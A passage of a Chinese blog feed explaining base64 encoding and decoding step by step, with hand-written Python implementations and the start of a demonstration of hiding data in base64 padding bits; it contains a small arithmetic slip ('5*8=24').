          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>base64加密原理和隐写</title>
      <link href="/article/2022-01-20-base64%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%92%8C%E9%9A%90%E5%86%99/"/>
      <url>/article/2022-01-20-base64%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%92%8C%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<p>本文主要记录base64原理及base64隐写的原理。</p><span id="more"></span><h4 id="base64加密"><a href="#base64加密" class="headerlink" title="base64加密"></a>base64加密</h4><p>base64 是一种编码方式, 是一种可逆的编码方式</p><p>编码后的数据使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串</p><p>一共64个字符：26+26+10+1+1=64，外加“=”符号用作后缀用途。</p><p><img src="/image/media/2022/base64/1.jpg"></p><p>因为2的6次方等于64，所以需要6位二进制来表示，表示数值从0到63，对应上表的64个数值。</p><h5 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.首先将待编码的内容转换成8位二进制，每3个字符为一组</span><br><span class="line">2.如果编码前的长度是3n+1，编码后的内容最后面补上2个 ‘=’，如果编码前的长度是3n+2，编码后的内容最后面补上1个 ‘=’</span><br><span class="line">3.再将每一组的二进制内容拆分成6位的二进制，不足6位的后面补足0</span><br><span class="line">4.每个6进制的数字前面补足0，保证变成8位二进制</span><br><span class="line">5.将补足后的内容根据base64编码表转换成base64内容输出</span><br></pre></td></tr></table></figure><p>首先是将明文字符串转换为二进制的形式，此处建议明文字符串使用ASCII字符，防止后期界面的时候不可打印</p><p>在加密过程中有两种情况：</p><ul><li>明文长度是三的倍数</li><li>明文不是三的倍数</li></ul><h6 id="明文字符串长度是三的倍数"><a href="#明文字符串长度是三的倍数" class="headerlink" title="明文字符串长度是三的倍数"></a>明文字符串长度是三的倍数</h6><p>用len作为输入的明文</p><p>首先需要将len字符串转换为二进制的形式（此处需要在不足8位的前面补充0，以便凑满8个二进制位）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ASCII字符   对应的二进制值</span><br><span class="line">l01101100</span><br><span class="line">e01100101</span><br><span class="line">n01101110</span><br></pre></td></tr></table></figure><p>将二进制组合成一个字符串：011011000110010101101110，可以看到正好是3*8=24位</p><p>然后按照6位一分可以正好分成24/6=4份，所以最后的密文的长度是4</p><p>将4个字符整理出对应的10进制，然后根据10进制的值去表格中找对应的字符的值，然后拼接形成密文bGVu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">011011+000110+010101+101110</span><br><span class="line">二进制  十进制base64表中对应的字符</span><br><span class="line">01101127b</span><br><span class="line">0001106G</span><br><span class="line">01010121V</span><br><span class="line">10111046u</span><br></pre></td></tr></table></figure><p>即len经过base64加密之后的密文是bGVu</p><p>根据站长工具验证，上述结论正确</p><p><img src="/image/media/2022/base64/2.jpg"></p><h6 id="明文不是三的倍数"><a href="#明文不是三的倍数" class="headerlink" title="明文不是三的倍数"></a>明文不是三的倍数</h6><p>当明文不是三个倍数时，明文转成二进制会导致后面不能够被6整除有可能，于是需要涉及填充字符</p><p>将Valen作为明文，首先将明文转成二进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ASCII字符   对应的二进制值</span><br><span class="line">V01010110</span><br><span class="line">a01100001</span><br><span class="line">l01101100</span><br><span class="line">e01100101</span><br><span class="line">n01101110</span><br></pre></td></tr></table></figure><p>将二进制组合成一个字符串：0101011001100001011011000110010101101110，可以看到长度是5*8=24位</p><p>按照6位是不能全部分开，可以看到最后一个不足6位，但是有4位，所以我们需要补两个0上去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">010101+100110+000101+101100+011001+010110+1110</span><br><span class="line">二进制  十进制base64表中对应的字符</span><br><span class="line">01010121V</span><br><span class="line">10011038m</span><br><span class="line">0001015F</span><br><span class="line">10110044s</span><br><span class="line">01100125Z</span><br><span class="line">01011022W</span><br><span class="line">111000564</span><br></pre></td></tr></table></figure><p>可以看到最后一位在后面填充了两个0，此时的密文信息为：VmFsZW4</p><p>因为填充了两个0所以需要补充一个等号在密文后面，要是补充了四个0则需要补充两个等号，所以密文最后最多只有两个等号。</p><p>即Valen经过base64加密之后的密文是VmFsZW4=</p><p>根据站长工具验证，上述结论正确</p><p><img src="/image/media/2022/base64/3.jpg"></p><h6 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h6><p>1.编码后的数据比原始数据略长，为原来的4/3</p><p>2.只含有65种字符，大写的A至Z，小写的a至z,数字0到9，以及3种符号+/ =，=最多两个，且在末尾</p><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><p>转换步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一步将待转换的字符串分割成一个个字符</span><br><span class="line">第二步计算每一个字符对应的ASCII码对应的二进制，若不足8位，在前面添加0进行补全</span><br><span class="line">第三步将得到的所有字符的二进制值，按照6个6个一组划分，若不能整除6，在最末添加0补足6位</span><br><span class="line">第四步计算6个划分后的二进制值的十进制值，不足八位补0</span><br><span class="line">第五步按照base64表，查看对应的字符</span><br><span class="line">第六步根据补0的个数在后面填充=号，两个0对应一个=，四个0对应两个=</span><br><span class="line">第七步得到最终结果</span><br></pre></td></tr></table></figure><p>下面是base64加密原理的python代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64所有的字典信息</span></span><br><span class="line">str_dict = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;10&#x27;</span>: <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;11&#x27;</span>: <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;12&#x27;</span>: <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;13&#x27;</span>: <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;14&#x27;</span>: <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;15&#x27;</span>: <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;16&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;17&#x27;</span>: <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;18&#x27;</span>: <span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;19&#x27;</span>: <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;20&#x27;</span>: <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;21&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;22&#x27;</span>: <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;23&#x27;</span>: <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;24&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;25&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;26&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;27&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;28&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;29&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;30&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;31&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;32&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;33&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;34&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;35&#x27;</span>: <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;36&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;37&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;38&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;39&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;40&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;41&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;42&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;43&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;44&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;45&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;46&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;47&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;48&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;49&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;50&#x27;</span>: <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;51&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;52&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;53&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;54&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;55&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;56&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;57&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;58&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;59&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;60&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;61&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;62&#x27;</span>: <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;63&#x27;</span>: <span class="string">&#x27;/&#x27;</span>&#125;</span><br><span class="line">mingwen = <span class="string">&#x27;valen&#x27;</span>  <span class="comment"># 此处十要加密的字符串内容</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;明文:&#x27;</span> + mingwen)</span><br><span class="line">two = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> mingwen:</span><br><span class="line">    <span class="comment"># two.join(bin(ord(m)).replace(&#x27;0b&#x27;,&#x27;&#x27;))</span></span><br><span class="line">    mingwen_two = <span class="built_in">bin</span>(<span class="built_in">ord</span>(m)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  <span class="comment"># 将字符转成二进制的形式</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(mingwen_two) &lt; <span class="number">8</span>:  <span class="comment"># 8位二进制形成一个accii码值</span></span><br><span class="line">        mingwen_two = <span class="string">&#x27;0&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(mingwen_two)) + mingwen_two  <span class="comment"># 位数不足的前面补0，补到8位</span></span><br><span class="line">    two = two + mingwen_two  <span class="comment"># 把所有的二进制都放在一个字符串里面，以便后期切割</span></span><br><span class="line">    <span class="built_in">print</span>(mingwen_two)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;明文的二进制形式:&#x27;</span> + two)  <span class="comment"># 字符对应ASCII转换成八位二进制的合并</span></span><br><span class="line">two_len = (<span class="built_in">len</span>(two) / <span class="number">6</span>)  <span class="comment"># 将明文的二进制形式按6位一分统计可以分成多少分，后期需要使用者这个数字</span></span><br><span class="line"><span class="comment"># print(two_len)</span></span><br><span class="line">two_len = math.ceil(two_len)  <span class="comment"># math.ceil用于向上取整小数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;向上取整个数:&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(two_len))</span><br><span class="line">miwen = <span class="string">&#x27;&#x27;</span></span><br><span class="line">add_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(two_len):  <span class="comment"># base64的基础单位是 3*8bit的二进制，若是不够3*8bit则在后面添加0字节（padding）直至满足</span></span><br><span class="line">    check = two[<span class="number">6</span> * i:<span class="number">6</span> + <span class="number">6</span> * i]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(check) &lt; <span class="number">6</span>:<span class="comment">#如果不是6位，就在后面补充多个0</span></span><br><span class="line">        add_num = <span class="number">6</span> - <span class="built_in">len</span>(check)<span class="comment">#记录补充多少个0</span></span><br><span class="line">        <span class="comment"># print(&#x27;填充字符数量&#123;0&#125;&#x27;.format(6-len(check)))</span></span><br><span class="line">        check = check + (<span class="built_in">str</span>(<span class="number">0</span>) * (<span class="number">6</span> - <span class="built_in">len</span>(check)))<span class="comment">#补0操作</span></span><br><span class="line">    <span class="built_in">print</span>(check)</span><br><span class="line">    <span class="comment"># print(int(check, 2))#二进制转成10进制</span></span><br><span class="line">    <span class="built_in">print</span>(str_dict[<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(check, <span class="number">2</span>))])  <span class="comment"># 从字典中取出对应的值</span></span><br><span class="line">    miwen += str_dict[<span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(check, <span class="number">2</span>))]<span class="comment">#字典中的值对应组成密文信息</span></span><br><span class="line">    <span class="keyword">if</span> add_num != <span class="number">0</span>:</span><br><span class="line">        miwen += <span class="string">&#x27;=&#x27;</span> * <span class="built_in">int</span>(add_num / <span class="number">2</span>)<span class="comment">#根据前面补充0的数量除以2的整数，去补充若干个=，最多不超过两个=</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;密文&#x27;</span> + miwen)</span><br></pre></td></tr></table></figure><h4 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h4><h5 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h5><p>就是加密过程的逆序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.根据密文信息从字典中取出对应的键</span><br><span class="line">2.将字符信息转成二进制形式，需要填满6位，等号因为没有就不会被转成二进制</span><br><span class="line">3.根据等号切割二进制位，将所有的二进制分成8位一份的十进制</span><br><span class="line">4.根据得到的十进制去找对应的ASCII字符</span><br><span class="line">5.拼接ASCII字符完成解密</span><br></pre></td></tr></table></figure><p>首先密文是dmFsZW4=，切割后得到dmFsZW4，然后得到每个字符在字典中的键，根据键转为二进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">密文中的字符字典对应的键值将键值转成二进制的形式</span><br><span class="line">d29011101</span><br><span class="line">m38100110</span><br><span class="line">F5000101</span><br><span class="line">s44101100</span><br><span class="line">Z25011001</span><br><span class="line">W22010110</span><br><span class="line">456111000</span><br></pre></td></tr></table></figure><p>然后将二进制形式合并成一个串：011101100110000101101100011001010110111000，此时为长度: 6*7=42</p><p>根据密文可以知道有一个等号于是删除末尾的两个0，得到二进制串0111011001100001011011000110010101101110，长度40正好是8的倍数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">01110110+01100001+01101100+01100101+01101110</span><br><span class="line">8位二进制二进制对应的十进制值十进制对应ASCII值</span><br><span class="line">01110110 118v</span><br><span class="line">0110000197a</span><br><span class="line">01101100108l</span><br><span class="line">01100101101e</span><br><span class="line">01101110110n</span><br></pre></td></tr></table></figure><p>拼接得到解密后的字符串valen</p><p>根据站长工具验证，上述结论正确</p><p><img src="/image/media/2022/base64/4.jpg"></p><h5 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">str_dict = &#123;<span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;J&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;10&#x27;</span>: <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;11&#x27;</span>: <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;12&#x27;</span>: <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;13&#x27;</span>: <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;14&#x27;</span>: <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;15&#x27;</span>: <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;16&#x27;</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;17&#x27;</span>: <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;18&#x27;</span>: <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;19&#x27;</span>: <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;20&#x27;</span>: <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;21&#x27;</span>: <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;22&#x27;</span>: <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;23&#x27;</span>: <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;24&#x27;</span>: <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;25&#x27;</span>: <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;26&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;27&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;28&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;29&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;30&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;31&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;32&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;33&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;34&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;35&#x27;</span>: <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;36&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;37&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;38&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;39&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;40&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;41&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;42&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;43&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;44&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;45&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;46&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;47&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;48&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;49&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;50&#x27;</span>: <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;51&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;52&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;53&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;54&#x27;</span>: <span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;55&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;56&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;57&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;58&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;59&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;60&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;61&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;62&#x27;</span>: <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;63&#x27;</span>: <span class="string">&#x27;/&#x27;</span>&#125;</span><br><span class="line">two=<span class="string">&#x27;&#x27;</span></span><br><span class="line">miwen=<span class="string">&#x27;dmFsZW4=&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;密文:&#x27;</span>+miwen)</span><br><span class="line"><span class="comment">#根据密文中的等号信息切割补充的0的数量</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;==&#x27;</span> <span class="keyword">in</span> miwen:</span><br><span class="line">    miwen=miwen[:-<span class="number">2</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> miwen:</span><br><span class="line">    miwen=miwen[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> miwen:</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> str_dict.items():</span><br><span class="line">        <span class="keyword">if</span> v == char:<span class="comment">#根据密文信息从字典中取出对应的键</span></span><br><span class="line">            mingwen_two = <span class="built_in">bin</span>(<span class="built_in">int</span>(k,<span class="number">10</span>)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  <span class="comment"># 将字符转成二进制的形式</span></span><br><span class="line">            <span class="built_in">print</span>(mingwen_two.zfill(<span class="number">6</span>))<span class="comment">#填充满6位字符</span></span><br><span class="line">            <span class="built_in">print</span>(k)<span class="comment">#键</span></span><br><span class="line">            <span class="built_in">print</span>(char)</span><br><span class="line">            two=two+mingwen_two.zfill(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;密文的二进制:&#x27;</span>+two)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;密码目前长度:&#x27;</span>,<span class="built_in">int</span>(<span class="built_in">len</span>(two)))<span class="comment">#要弄成8的倍数</span></span><br><span class="line">ten=<span class="string">&#x27;&#x27;</span></span><br><span class="line">yuanwen=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(two)/<span class="number">8</span>)):<span class="comment">#8位一分，挨个处理对应的字符串的值，并将其转成十进制，然后根据十进制转成字符信息</span></span><br><span class="line">    <span class="built_in">print</span>(two[<span class="number">8</span>*i:<span class="number">8</span>+<span class="number">8</span>*i])</span><br><span class="line">    ten=<span class="built_in">int</span>(two[<span class="number">8</span>*i:<span class="number">8</span>+<span class="number">8</span>*i], <span class="number">2</span>) <span class="comment"># 二进制转成10进制</span></span><br><span class="line">    <span class="built_in">print</span>(ten)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(ten))</span><br><span class="line">    yuanwen+=<span class="built_in">chr</span>(ten)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;明文&#x27;</span>+yuanwen)<span class="comment">#输出解码后的信息</span></span><br></pre></td></tr></table></figure><h4 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h4><p>根据上面的信息可以知道valen对应的base64密文是dmFsZW4=</p><p>运行下面的程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">b = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    b = <span class="string">&#x27;dmFsZW4&#x27;</span> + <span class="built_in">chr</span>(<span class="number">52</span> + i) + <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(base64.b64decode(b))</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dmFsZW4=b&#x27;valen&#x27;</span><br><span 